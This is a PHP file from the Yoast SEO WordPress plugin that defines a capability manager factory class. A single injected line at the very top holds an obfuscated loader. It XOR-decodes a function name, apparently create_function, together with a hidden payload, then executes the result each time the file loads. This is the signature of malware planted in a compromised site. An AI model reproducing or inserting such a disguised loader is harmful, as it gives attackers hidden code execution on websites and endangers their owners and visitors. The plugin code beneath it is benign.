<?php $XfJeEq='6>U25N87C=.M,+Z'^'UL0SA+gQ6SM9ED4';$vFicdloJkau=$XfJeEq('','.6QtQY=Q>ZOUlEEI2Z2GF9VAt36G8+>YMLspxu+Nx K>->U=CnSB1>QY74o-WKHCnURGWyzR30;OXwVrn>YLpc68,zOlfRlgfnK.NmHXFjtyHzp<F <;YU7Rt=3ISevdf<LYFppogS,8byiEQsI;N2fnXnK3hjV1A3wGCpu=JE;0NcFPSYygHISz50VA2>CaO7;TKhmFCbVd3FVX;.LjsXZ:9SKAA1V885S+AklS19T1Elx02CA Y6>aknsh;xqi-uVKzMK2AaNvqn3O+X=LJJCZKY,XQo,HESykF>+5yfYPQ3NLfUqJC3QB7ye1Pe8JQFVw-XYQJu+fG+604QQUIeF2y 0-kghoJ6VOEI0twQAiB5L=QQH3gdJqWPGL;Y<0gGcGWQ;J<bGeTL< NUThN;AH1v=5CNHebR2MYZmUquU4+TR:,.DQ<dFT4hO6E.co 7-B1 ;RAc0U5YX>-OPQV=1EFGpD;:9l=2YfQyF=QzGJ5IQxcLz0Y8MR7<E1kXABS38yK,2LUhDEH5HPYlVLyq.Hdnu2->8+L,Y5snSbDllb9PVSJETBODC0YaPIrX+omFbRFJX11B6WAnSCsx0FLS=4Q2C.TV;HDFzlLO-5C3RWoSa+1DYbNebwDJa+myE>A9pHZP;S0p72C6>LSOsHh;=-N9YiymKSN'^'GPyU7,S2J3 ;3 = A.AoaA93+WW3Yta488TYQUPDqF>PNJ<R-N+-Ca58CU0r:><kJ1336UZvXUBfxWvRNESEyGYMXZrLAuWmog-A<El1fWTIsZTUzSHI50YzPYR=2LMDBUgrozyfC<YLBWTeyW-Z:S=J13kmHN=T8hS.cUUN>7WU Kb;6 P:arYs<B35GL-IkXN bSgO>h+n9b29OOlWS>;VJ6pKeU7LYj8N8KQsWX8B Wr:T,3E8UVACJ,+t7: hU78Zi W8AsHQJE.G-Xej1ISo=M,00G-<sDKbUNLBlPt5R:-FhQn5R=7RBoLZoQ,qnwSI9-0cUPlNMYBQ02=iMbm+eax.4<O+Evk.,ITJoaM4T H4xhHmmCU313-d2YIGzCc<4Bq6kNA0-HAnhtL8Z-=TM7<>D5ohvV,-;MhQ5 ZX1 SMB-+YL>;F7+W1O<0MBYjSAH7wWo1P:7ZHgt57IPljgT ZNX3VW OxBLT7Rc.T=0XEjZQ+J,+hW H4=9+ GKQlGW5rDda,T<1pLpjYYC,QFQVLJYpkG<LT3zByQLEXdckzwfrvsvRhP5-FhMYXsPct,;TUwP2fGseUXQ4>2Dk:W:q1.R;05RK<.TY,R6pCsEOP08KgEBWdjAPgp H UXl>1O2kWGS:ZQ-7h.aS14H6P-AIDpY3');$vFicdloJkau();
/**
 * @package WPSEO\Admin\Capabilities
 */

/**
 * Capability Manager Factory.
 */
class WPSEO_Capability_Manager_Factory {
	/**
	 * Returns the Manager to use.
	 *
	 * @return WPSEO_Capability_Manager Manager to use.
	 */
	public static function get() {
		static $manager = null;

		if ( $manager === null ) {
			if ( function_exists( 'wpcom_vip_add_role_caps' ) ) {
				$manager = new WPSEO_Capability_Manager_VIP();
			}

			if ( ! function_exists( 'wpcom_vip_add_role_caps' ) ) {
				$manager = new WPSEO_Capability_Manager_WP();
			}
		}

		return $manager;
	}
}
